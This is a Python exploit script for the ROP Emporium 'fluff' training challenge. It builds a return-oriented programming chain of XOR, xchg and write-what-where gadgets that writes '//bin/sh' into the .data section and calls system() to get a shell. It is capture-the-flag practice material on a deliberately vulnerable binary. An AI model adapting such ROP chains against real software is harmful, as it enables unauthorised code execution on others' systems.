#!/usr/bin/python

# created for the ROP Emporium 64-bit challenge "fluff"
# uses multiple gadgets to achieve essentially the same effect as a pop gadget
# note the use of XOR to move a value into a cleared register by XORing it against a register
# with a non-null value

import struct

writable_mem = struct.pack("Q",0x00601050) # .data section

# gadgets
system_plt = struct.pack("Q",0x4005e0) # objdump -D -Mintel fluff |grep system
pop_rdi = struct.pack("Q",0x004008c3) # pop rdi; ret;
# use the below gadget to write contents of r11 to address stored in r10
write_what_where = struct.pack("Q",0x0040084e) # mov qword [r10], r11; pop r13; pop r12; xor byte [r10], r12b; ret;
# use the below gadget to zero out r11
xor_r11 = struct.pack("Q",0x00400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
pop_r12 = struct.pack("Q",0x00400832) # pop r12; mov r13d, 0x604060; ret;
# use the below gadget for writing contents of r12 to zeroed-out r11
xor_r11_r12 = struct.pack("Q",0x0040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
# use the below gadget to swap the values in r11 and r10
xchg = struct.pack("Q",0x00400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;

# 40-byte offset
payload = "A" * 40

# begin chain
payload += pop_r12
payload += writable_mem
# clear r11 and use junk for the pop r14 instruction
payload += xor_r11
payload += "whatever"
# place contents of r12 into r11 via XOR; use junk for pop r12
payload += xor_r11_r12
payload += "whatever"
# use xchg to move contents of r11 to r10; use junk for pop r15
payload += xchg
payload += "whatever"
# now get /bin/sh into r11 so it can be written to address in r10
payload += pop_r12
payload += "//bin/sh"
payload += xor_r11
payload += "whatever"
payload += xor_r11_r12
payload += "whatever"
# finally, write /bin/sh to the .data section
# compensate for r13 and r12 pops
payload += write_what_where
payload += "whatever"
# zero out r12 to prevent an issue with the write gadget
payload += struct.pack("Q",0x0)
# now call system with string in memory
payload += pop_rdi
payload += writable_mem
payload += system_plt

print payload
